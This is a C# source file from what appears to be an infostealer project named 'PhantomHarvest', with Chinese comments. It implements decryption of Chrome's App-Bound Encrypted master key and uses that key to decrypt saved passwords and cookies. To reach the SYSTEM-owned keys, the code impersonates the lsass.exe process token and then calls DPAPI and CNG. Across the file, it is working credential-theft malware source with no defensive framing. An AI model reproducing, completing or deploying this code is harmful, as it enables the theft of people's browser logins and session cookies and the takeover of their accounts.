using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace PhantomHarvest.Helper
{
	/// <summary>
	/// Chrome v20+ App-Bound Encryption 解密器
	/// 支持 Chrome 127+ 的 app_bound_encrypted_key 解密
	/// </summary>
	internal class ChromeV20Decryptor
	{
		// Chrome 127-132, 137+ (flag 1) - AES-256-GCM 硬编码密钥
		private static readonly byte[] AES_KEY_FLAG1 = new byte[]
		{
			0xB3, 0x1C, 0x6E, 0x24, 0x1A, 0xC8, 0x46, 0x72,
			0x8D, 0xA9, 0xC1, 0xFA, 0xC4, 0x93, 0x66, 0x51,
			0xCF, 0xFB, 0x94, 0x4D, 0x14, 0x3A, 0xB8, 0x16,
			0x27, 0x6B, 0xCC, 0x6D, 0xA0, 0x28, 0x47, 0x87
		};

		// Chrome 133-136 (flag 2) - ChaCha20-Poly1305 硬编码密钥
		private static readonly byte[] CHACHA20_KEY_FLAG2 = new byte[]
		{
			0xE9, 0x8F, 0x37, 0xD7, 0xF4, 0xE1, 0xFA, 0x43,
			0x3D, 0x19, 0x30, 0x4D, 0xC2, 0x25, 0x80, 0x42,
			0x09, 0x0E, 0x2D, 0x1D, 0x7E, 0xEA, 0x76, 0x70,
			0xD4, 0x1F, 0x73, 0x8D, 0x08, 0x72, 0x96, 0x60
		};

		// Chrome 137+ (flag 3) - XOR 密钥（用于CNG解密后的AES密钥）
		private static readonly byte[] XOR_KEY_FLAG3 = new byte[]
		{
			0xCC, 0xF8, 0xA1, 0xCE, 0xC5, 0x66, 0x05, 0xB8,
			0x51, 0x75, 0x52, 0xBA, 0x1A, 0x2D, 0x06, 0x1C,
			0x03, 0xA2, 0x9E, 0x90, 0x27, 0x4F, 0xB2, 0xFC,
			0xF5, 0x9B, 0xA4, 0xB7, 0x5C, 0x39, 0x23, 0x90
		};

		/// <summary>
		/// 从 Local State 文件解密 app_bound_encrypted_key 获得 v20 Master Key
		/// </summary>
		public static byte[] GetV20MasterKey(string localStatePath)
		{
			try
			{
				// Console.WriteLine("[DEBUG] 正在读取 Local State: " + localStatePath);
				
				// 1. 修复读取方式：使用 LockedFile 读取可能被锁定的文件
				byte[] fileBytes = LockedFile.ReadLockedFile(localStatePath);
				if (fileBytes == null)
				{
					// Console.WriteLine("[DEBUG] 失败：无法读取文件（可能被锁定且LockedFile失败）");
					return null;
				}
				
				string json = Encoding.UTF8.GetString(fileBytes);
				
				// 提取 app_bound_encrypted_key（base64）
				string searchKey = "\"app_bound_encrypted_key\":\"";
				int startIndex = json.IndexOf(searchKey);
				if (startIndex == -1)
				{
					// Console.WriteLine("[DEBUG] 失败：未找到 app_bound_encrypted_key（可能是旧版本Chrome）");
					return null; 
				}

				startIndex += searchKey.Length;
				int endIndex = json.IndexOf("\"", startIndex);
				if (endIndex == -1)
					return null;

				string base64Key = json.Substring(startIndex, endIndex - startIndex);
				byte[] encryptedKeyBlob = Convert.FromBase64String(base64Key);

				// 验证 "APPB" 前缀
				if (encryptedKeyBlob.Length < 4 || 
				    encryptedKeyBlob[0] != 'A' || encryptedKeyBlob[1] != 'P' ||
				    encryptedKeyBlob[2] != 'P' || encryptedKeyBlob[3] != 'B')
				{
					// Console.WriteLine("[DEBUG] 失败：不是有效的 APPB 密钥前缀");
					return null;
				}

				// 去除 "APPB" 前缀
				byte[] keyBlobEncrypted = new byte[encryptedKeyBlob.Length - 4];
				Array.Copy(encryptedKeyBlob, 4, keyBlobEncrypted, 0, keyBlobEncrypted.Length);

				// 第一步: SYSTEM DPAPI 解密
				// Console.WriteLine("[DEBUG] 正在尝试 System DPAPI 解密...");
				byte[] keyBlobSystemDecrypted = null;
				try
				{
					// 尝试模拟SYSTEM权限进行解密
					keyBlobSystemDecrypted = DecryptWithSystemDPAPI(keyBlobEncrypted);
				}
				catch (Exception ex)
				{
					// Console.WriteLine("[DEBUG] System DPAPI 异常: " + ex.Message);
				}

				if (keyBlobSystemDecrypted == null)
				{
					// Console.WriteLine("[DEBUG] 失败：System DPAPI 解密返回空（检查管理员权限或反病毒拦截）");
					return null;
				}

				// 第二步: User DPAPI 解密
				// Console.WriteLine("[DEBUG] 正在尝试 User DPAPI 解密...");
				byte[] keyBlobUserDecrypted = ProtectedData.Unprotect(
					keyBlobSystemDecrypted, 
					null, 
					DataProtectionScope.CurrentUser
				);

				// 解析 Key Blob
				return ParseAndDecryptKeyBlob(keyBlobUserDecrypted);
			}
			catch (Exception ex)
			{
				// Console.WriteLine("[DEBUG] GetV20MasterKey 发生异常: " + ex.Message);
				return null; // 任何错误都返回null，回退到v10
			}
		}

		/// <summary>
		/// 使用SYSTEM DPAPI解密（需要管理员权限和token impersonation）
		/// </summary>
		private static byte[] DecryptWithSystemDPAPI(byte[] data)
		{
			// 检查是否有管理员权限
			if (!HandleStealer.IsAdmin())
			{
				// Console.WriteLine("[DEBUG] 失败：没有管理员权限");
				return null;
			}

			try
			{
				// 尝试模拟SYSTEM用户token
				// 寻找lsass.exe进程并复制其token
				System.Diagnostics.Process[] processes = System.Diagnostics.Process.GetProcesses();
				foreach (var proc in processes)
				{
					try
					{
						if (proc.ProcessName.ToLower() == "lsass")
						{
							// Console.WriteLine("[DEBUG] 找到 lsass 进程 ID: " + proc.Id);
							// 尝试模拟token（需要SeDebugPrivilege，已在Methods.ImpersonateProcessToken中处理）
							if (Methods.ImpersonateProcessToken(proc.Id))
							{
								// Console.WriteLine("[DEBUG] 成功模拟 System Token");
								try
								{
									// 在SYSTEM上下文中解密
									//以此身份运行时，Scope应为CurrentUser（即System用户）
									byte[] decrypted = ProtectedData.Unprotect(data, null, DataProtectionScope.CurrentUser);
									
									// Console.WriteLine("[DEBUG] System DPAPI 解密成功！");
									
									// 恢复原始token
									Win32Api.RevertToSelf();
									
									return decrypted;
								}
								catch (Exception ex)
								{
									// Console.WriteLine("[DEBUG] System DPAPI Unprotect 失败: " + ex.Message);
									Win32Api.RevertToSelf();
									// 继续尝试其他 lsass 进程（虽然通常只有一个）
								}
							}
							else
							{
								// Console.WriteLine("[DEBUG] 模拟 System Token 失败");
							}
						}
					}
					catch (Exception ex)
					{
						// Console.WriteLine("[DEBUG] 处理 lsass 进程时出错: " + ex.Message);
					}
				}
			}
			catch (Exception ex)
			{
				// Console.WriteLine("[DEBUG] 获取进程列表失败: " + ex.Message);
			}

			return null;
		}

		/// <summary>
		/// 解析并解密 Key Blob
		/// </summary>
		private static byte[] ParseAndDecryptKeyBlob(byte[] blob)
		{
			using (MemoryStream ms = new MemoryStream(blob))
			using (BinaryReader reader = new BinaryReader(ms))
			{
				// 读取头部长度（4字节）
				int headerLen = reader.ReadInt32();
				if (headerLen < 0 || headerLen > blob.Length)
					return null;

				// 跳过头部
				reader.ReadBytes(headerLen);

				// 读取内容长度（4字节）
				int contentLen = reader.ReadInt32();
				if (contentLen < 0 || contentLen > blob.Length)
					return null;

				// 读取flag（1字节）
				byte flag = reader.ReadByte();
				// Console.WriteLine("[DEBUG] Key Blob Flag: " + flag);

				if (flag == 1)
				{
					// Flag 1: AES-256-GCM (Chrome 127-132, 137+)
					byte[] iv = reader.ReadBytes(12);
					byte[] ciphertext = reader.ReadBytes(32);
					byte[] tag = reader.ReadBytes(16);

					return DecryptAesGcm(AES_KEY_FLAG1, iv, ciphertext, tag);
				}
				else if (flag == 2)
				{
					// Flag 2: ChaCha20-Poly1305 (Chrome 133-136)
					byte[] iv = reader.ReadBytes(12);
					byte[] ciphertext = reader.ReadBytes(32);
					byte[] tag = reader.ReadBytes(16);

					return DecryptChaCha20Poly1305(CHACHA20_KEY_FLAG2, iv, ciphertext, tag);
				}
				else if (flag == 3)
				{
					// Flag 3: CNG + AES-256-GCM (Chrome 137+最新)
					// Console.WriteLine("[DEBUG] 检测到 Flag 3 (CNG加密)，正在尝试解密...");
					byte[] encryptedAesKey = reader.ReadBytes(32);
					byte[] iv = reader.ReadBytes(12);
					byte[] ciphertext = reader.ReadBytes(32);
					byte[] tag = reader.ReadBytes(16);

					// 1. 使用 CNG 解密 AES Key (需要模拟 SYSTEM 权限)
					byte[] decryptedAesKey = null;
					
					// 再次模拟 SYSTEM 权限，因为 CNG Key 也是 SYSTEM 拥有的
					if (HandleStealer.IsAdmin())
					{
						System.Diagnostics.Process[] processes = System.Diagnostics.Process.GetProcesses();
						foreach (var proc in processes)
						{
							if (proc.ProcessName.ToLower() == "lsass")
							{
								if (Methods.ImpersonateProcessToken(proc.Id))
								{
									try
									{
										decryptedAesKey = DecryptWithCNG(encryptedAesKey);
									}
									finally
									{
										Win32Api.RevertToSelf();
									}
									if (decryptedAesKey != null) break;
								}
							}
						}
					}

					if (decryptedAesKey == null)
					{
						// Console.WriteLine("[DEBUG] 失败：CNG 解密 AES Key 失败");
						return null;
					}

					// 2. XOR 操作
					byte[] xoredAesKey = new byte[decryptedAesKey.Length];
					for (int i = 0; i < decryptedAesKey.Length; i++)
					{
						xoredAesKey[i] = (byte)(decryptedAesKey[i] ^ XOR_KEY_FLAG3[i]);
					}

					// 3. 使用最终的 AES Key 解密 Master Key
					byte[] masterKey = DecryptAesGcm(xoredAesKey, iv, ciphertext, tag);
					if (masterKey != null)
					{
						// Console.WriteLine("[DEBUG] V20 Master Key 解密成功！长度: " + masterKey.Length);
					}
					else
					{
						// Console.WriteLine("[DEBUG] 失败：V20 Master Key 解密返回空 (Tag Mismatch?)");
					}
					
					return masterKey;
				}

				return null;
			}
		}

		/// <summary>
		private static byte[] DecryptWithCNG(byte[] encryptedData)
		{
			// Console.WriteLine("[DEBUG] 进入 DecryptWithCNG");
			IntPtr hProvider = IntPtr.Zero;
			IntPtr hKey = IntPtr.Zero;
			try
			{
				// 打开存储提供程序
				int status = Win32Api.NCryptOpenStorageProvider(out hProvider, "Microsoft Software Key Storage Provider", 0);
				if (status != 0)
				{
					// Console.WriteLine("[DEBUG] NCryptOpenStorageProvider 失败: " + status);
					return null;
				}
				
				// 稍微等待一下，防止 Release 模式下的竞态
				System.Threading.Thread.Sleep(50);

				// 尝试打开密钥
				// 策略：尝试常见的 Key Name
				string[] keyNames = { "Google Chromekey1", "Microsoft Edge Key", "Chromium Key" };
				
				foreach (string keyName in keyNames)
				{
					status = Win32Api.NCryptOpenKey(hProvider, out hKey, keyName, 0, 0);
					if (status == 0)
					{
						// Console.WriteLine("[DEBUG] 成功打开密钥: " + keyName);
						
						// 成功打开密钥，尝试解密
						int resultSize;
						status = Win32Api.NCryptDecrypt(hKey, encryptedData, encryptedData.Length, IntPtr.Zero, null, 0, out resultSize, 0x40); // NCRYPT_SILENT_FLAG = 0x40
						if (status == 0)
						{
							byte[] output = new byte[resultSize];
							int finalSize; 
							status = Win32Api.NCryptDecrypt(hKey, encryptedData, encryptedData.Length, IntPtr.Zero, output, output.Length, out finalSize, 0x40);
							if (status == 0)
							{
								// Console.WriteLine("[DEBUG] CNG 解密成功");
								
								// 调整数组大小到实际解密长度
								if (finalSize != output.Length)
								{
									byte[] finalOutput = new byte[finalSize];
									Array.Copy(output, finalOutput, finalSize);
									output = finalOutput;
								}
								
								Win32Api.NCryptFreeObject(hKey);
								Win32Api.NCryptFreeObject(hProvider);
								return output;
							}
						}
						Win32Api.NCryptFreeObject(hKey);
						hKey = IntPtr.Zero;
					}
				}
			}
			catch (Exception ex)
			{
				// Console.WriteLine("[DEBUG] DecryptWithCNG 异常: " + ex.ToString());
			}
			finally
			{
				if (hKey != IntPtr.Zero) Win32Api.NCryptFreeObject(hKey);
				if (hProvider != IntPtr.Zero) Win32Api.NCryptFreeObject(hProvider);
			}
			// Console.WriteLine("[DEBUG] DecryptWithCNG 失败");
			return null;
		}

		/// <summary>
		/// AES-256-GCM 解密
		/// </summary>
		private static byte[] DecryptAesGcm(byte[] key, byte[] nonce, byte[] ciphertext, byte[] tag)
		{
			try
			{
				return new AesGcm().Decrypt(key, nonce, null, ciphertext, tag);
			}
			catch (Exception ex)
			{
				Console.WriteLine("[DEBUG] AES-GCM 解密异常: " + ex.Message);
				return null;
			}
		}

		/// <summary>
		/// ChaCha20-Poly1305 解密（需要.NET 6+或自定义实现）
		/// 由于ChaCha20在.NET Framework中不原生支持，这里先返回null
		/// 如果需要完整支持，需要引入第三方库（如Bouncy Castle）
		/// </summary>
		private static byte[] DecryptChaCha20Poly1305(byte[] key, byte[] nonce, byte[] ciphertext, byte[] tag)
		{
			// ChaCha20-Poly1305 不是.NET Framework原生支持的
			// 需要使用第三方库或Win32 CNG API
			// 暂时返回null，Chrome 133-136用户较少，可以手动降级Chrome版本
			return null;
		}

		/// <summary>
		/// 使用v20 master key 解密cookie/password的encrypted_value
		/// 格式: v20|iv(12bytes)|ciphertext|tag(16bytes)
		/// </summary>
		public static string DecryptV20Value(byte[] encryptedValue, byte[] v20MasterKey, bool isCookie = false)
		{
			try
			{
				if (encryptedValue == null || encryptedValue.Length < 3 + 12 + 16)
					return null;

				// 验证 "v20" 前缀
				if (encryptedValue[0] != 'v' || encryptedValue[1] != '2' || encryptedValue[2] != '0')
					return null;

				// 提取组件
				byte[] iv = new byte[12];
				Array.Copy(encryptedValue, 3, iv, 0, 12);

				int ciphertextLen = encryptedValue.Length - 3 - 12 - 16;
				byte[] ciphertext = new byte[ciphertextLen];
				Array.Copy(encryptedValue, 3 + 12, ciphertext, 0, ciphertextLen);

				byte[] tag = new byte[16];
				Array.Copy(encryptedValue, encryptedValue.Length - 16, tag, 0, 16);

				// 解密
				byte[] decrypted = new AesGcm().Decrypt(v20MasterKey, iv, null, ciphertext, tag);

				// Chrome在cookie值前面添加了32字节的padding需要跳过
				if (isCookie && decrypted.Length > 32)
				{
					byte[] unpadded = new byte[decrypted.Length - 32];
					Array.Copy(decrypted, 32, unpadded, 0, unpadded.Length);
					decrypted = unpadded;
				}

				return Encoding.UTF8.GetString(decrypted);
			}
			catch
			{
				return null;
			}
		}
	}
}
